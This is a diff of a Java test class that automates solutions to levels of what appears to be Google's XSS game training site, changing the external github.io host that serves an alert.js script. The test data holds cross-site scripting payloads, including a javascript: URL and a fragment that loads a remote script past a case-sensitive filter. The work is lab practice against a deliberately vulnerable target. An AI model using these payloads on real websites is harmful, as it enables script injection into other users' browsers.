@@ -25,7 +25,7 @@ public class XSSTest extends BaseTest {
             .inputScriptForFifthPage("/signup?next=javascript:alert(\"xss\");")
             .acceptAlert()
             .goToSixthhLevel()
-            .inputScriptForSixthPage("https://xss-game.appspot.com/level6/frame#htTps://mariaoskar.github.io/XSSTest/alert.js")
+            .inputScriptForSixthPage("https://xss-game.appspot.com/level6/frame#htTps://amlet86.github.io/alert.js")
             .acceptAlert()
             .goToDone();
 
